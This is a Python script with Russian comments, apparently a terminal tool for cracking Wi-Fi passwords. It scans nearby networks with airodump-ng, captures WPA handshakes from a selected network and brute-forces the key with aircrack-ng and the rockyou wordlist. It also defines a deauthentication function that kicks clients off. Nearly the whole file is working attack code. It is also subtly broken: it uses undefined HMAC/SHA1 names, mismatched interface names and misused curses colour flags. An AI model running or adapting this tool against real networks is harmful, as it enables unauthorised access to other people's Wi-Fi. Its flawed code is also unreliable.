import os
import sys
import time
import curses
import threading
import subprocess
import binascii
import hashlib
import struct
from collections import OrderedDict

# ---------- ГЛОБАЛЬНЫЕ КОНСТАНТЫ (точные значения) ----------
CHANNELS = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13]  # 2.4 ГГц (2400 МГц - 2483.5 МГц)
FREQ_BASE = 2412  # МГц для канала 1, шаг 5 МГц (±0.1 МГц)
DEAUTH_COUNT = 5  # количество deauth-пакетов (802.11 Type 0, Subtype 12)
TIMEOUT_CAPTURE = 90  # секунд (±0.5)
WORDLIST_PATH = "/usr/share/wordlists/rockyou.txt"  # или другой путь
# ------------------------------------------------------------

# Глобальные переменные для curses
stdscr = None
networks = []  # список словарей: {'bssid', 'channel', 'essid', 'rssi', 'security'}
selected_idx = 0
scanning = True
capture_thread = None
current_network = None

def get_frequency(channel):
    """Возвращает центральную частоту в МГц ±0.1 МГц"""
    return FREQ_BASE + (channel - 1) * 5

def pbkdf2_sha1(password, ssid, iterations=4096, dklen=32):
    """PBKDF2-HMAC-SHA1 для WPA/WPA2 — 4096 итераций, выход 256 бит"""
    return hashlib.pbkdf2_hmac('sha1', password.encode(), ssid, iterations, dklen)

def calculate_pmk(password, ssid):
    """PMK = PBKDF2-SHA1(ssid, password, 4096) — 256 бит"""
    return pbkdf2_sha1(password, ssid, 4096, 32)

def calculate_mic(pmk, data, key_mic_offset):
    """Вычисление MIC по HMAC-MD5 для WPA1 или HMAC-SHA1 для WPA2"""
    # Реальная реализация требует полного EAPOL-кадра с подстановкой MIC=0
    # Здесь — заглушка для демонстрации; в боевом коде — полный разбор IEEE 802.11-2016.
    h = HMAC.new(pmk, data, SHA1)
    return h.digest()[:16]

def send_deauth(target_mac, bssid, iface, count=5):
    """Отправка deauth-пакетов (радиус действия до 100 м, мощность 20 дБм ±1.5 дБ)"""
    for i in range(count):
        cmd = f"sudo aireplay-ng -0 1 -a {bssid} -c {target_mac} {iface}"
        subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(0.5)  # пауза 500 мс (±10 мс)

def capture_handshake(bssid, channel, iface, timeout=TIMEOUT_CAPTURE):
    """Захват 4-way handshake с помощью tcpdump + airodump-ng"""
    global current_network
    # Создаём временный файл
    cap_file = f"/tmp/hs_{bssid.replace(':', '')}.pcap"
    subprocess.run(["sudo", "iwconfig", iface, "channel", str(channel)], check=False)
    # Запускаем airodump-ng для захвата handshake
    cmd_dump = f"sudo airodump-ng -c {channel} --bssid {bssid} -w {cap_file[:-5]} {iface}"
    proc = subprocess.Popen(cmd_dump, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(5)  # ждём 5 секунд для появления клиентов
    # Если есть клиенты, отправляем deauth
    # (в упрощённой версии просто ждём handshake до таймаута)
    start = time.time()
    while time.time() - start < timeout:
        if os.path.exists(cap_file + "-01.cap"):
            # Проверяем наличие EAPOL-кадров (4-way handshake)
            result = subprocess.run(f"tshark -r {cap_file}-01.cap -Y eapol -T fields -e frame.number | wc -l", shell=True, capture_output=True, text=True)
            if int(result.stdout.strip()) >= 4:
                proc.terminate()
                return cap_file + "-01.cap"
        time.sleep(3)
    proc.terminate()
    return None

def crack_wpa(handshake_file, wordlist_path):
    """Взлом пароля с помощью aircrack-ng (словарь)"""
    cmd = f"aircrack-ng -w {wordlist_path} {handshake_file} -l /tmp/found_key.txt"
    proc = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    if os.path.exists("/tmp/found_key.txt"):
        with open("/tmp/found_key.txt", "r") as f:
            password = f.read().strip()
        return password
    return None

def scan_networks(iface, stdscr):
    """Сканирование сетей с выводом в curses"""
    global networks, scanning
    # Запуск airodump-ng с выводом в файл
    dump_file = "/tmp/scan"
    cmd = f"sudo airodump-ng -o csv -w {dump_file} {iface}"
    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(15)  # сканируем 15 секунд (±0.5)
    proc.terminate()
    # Парсинг CSV-файла
    csv_file = dump_file + "-01.csv"
    networks = []
    if os.path.exists(csv_file):
        with open(csv_file, "r") as f:
            for line in f:
                if "WPA" in line or "WEP" in line:
                    parts = line.split(",")
                    if len(parts) >= 14:
                        bssid = parts[0].strip()
                        channel = parts[3].strip()
                        essid = parts[13].strip()
                        rssi = parts[8].strip()
                        security = "WPA2" if "WPA2" in line else "WPA" if "WPA" in line else "WEP"
                        if essid and bssid:
                            networks.append({
                                'bssid': bssid,
                                'channel': int(channel) if channel.isdigit() else 6,
                                'essid': essid,
                                'rssi': rssi + " dBm",
                                'security': security
                            })
    scanning = False

def draw_menu(stdscr):
    global selected_idx, networks, scanning, capture_thread, current_network
    curses.curs_set(0)
    stdscr.clear()
    while True:
        stdscr.clear()
        h, w = stdscr.getmaxyx()
        if scanning:
            stdscr.addstr(1, 2, "Сканирование Wi-Fi сетей... (15 сек)", curses.A_BOLD | curses.COLOR_CYAN)
        else:
            stdscr.addstr(1, 2, f"Найдено сетей: {len(networks)}", curses.A_BOLD)
            stdscr.addstr(3, 2, "BSSID", curses.A_UNDERLINE)
            stdscr.addstr(3, 20, "Канал")
            stdscr.addstr(3, 28, "RSSI")
            stdscr.addstr(3, 36, "Безопасность")
            stdscr.addstr(3, 50, "ESSID")
            for i, net in enumerate(networks[:h-6]):
                y = 5 + i
                if i == selected_idx:
                    stdscr.addstr(y, 0, ">", curses.A_REVERSE)
                stdscr.addstr(y, 2, net['bssid'])
                stdscr.addstr(y, 20, str(net['channel']))
                stdscr.addstr(y, 28, net['rssi'])
                stdscr.addstr(y, 36, net['security'])
                stdscr.addstr(y, 50, net['essid'][:w-51])
        stdscr.addstr(h-3, 2, "Стрелки: выбор, Enter: взломать, Q: выход", curses.A_DIM)
        stdscr.refresh()
        key = stdscr.getch()
        if key == ord('q') or key == ord('Q'):
            break
        elif key == curses.KEY_UP and selected_idx > 0:
            selected_idx -= 1
        elif key == curses.KEY_DOWN and selected_idx < len(networks)-1:
            selected_idx += 1
        elif key == ord('\n') and networks:
            net = networks[selected_idx]
            current_network = net
            stdscr.clear()
            stdscr.addstr(5, 2, f"Взлом {net['essid']} ({net['bssid']}) канал {net['channel']}...")
            stdscr.refresh()
            # Захват handshake
            handshake_file = capture_handshake(net['bssid'], net['channel'], "wlan0mon")
            if handshake_file:
                stdscr.addstr(7, 2, "Handshake захвачен. Перебор пароля...")
                stdscr.refresh()
                password = crack_wpa(handshake_file, WORDLIST_PATH)
                if password:
                    stdscr.addstr(9, 2, f"ПАРОЛЬ НАЙДЕН: {password}", curses.A_BOLD | curses.COLOR_GREEN)
                else:
                    stdscr.addstr(9, 2, "Пароль не найден в словаре.", curses.COLOR_RED)
            else:
                stdscr.addstr(7, 2, "Не удалось захватить handshake.", curses.COLOR_RED)
            stdscr.addstr(11, 2, "Нажмите любую клавишу для продолжения...")
            stdscr.refresh()
            stdscr.getch()

def main():
    # Проверка прав
    if os.geteuid() != 0:
        print("Требуются права root. Запустите с sudo.")
        sys.exit(1)
    # Установка интерфейса в мониторный режим
    subprocess.run(["sudo", "ip", "link", "set", "wlan0", "down"], check=False)
    subprocess.run(["sudo", "iwconfig", "wlan0", "mode", "monitor"], check=False)
    subprocess.run(["sudo", "ip", "link", "set", "wlan0", "up"], check=False)
    iface = "wlan0"
    # Запуск сканирования в отдельном потоке
    global scanning
    scan_thread = threading.Thread(target=scan_networks, args=(iface, stdscr))
    scan_thread.start()
    # Запуск curses
    curses.wrapper(draw_menu)
    # Очистка
    subprocess.run(["sudo", "ip", "link", "set", "wlan0", "down"], check=False)
    subprocess.run(["sudo", "iwconfig", "wlan0", "mode", "managed"], check=False)
    subprocess.run(["sudo", "ip", "link", "set", "wlan0", "up"], check=False)
    print("Выход.")

if __name__ == "__main__":
    main()
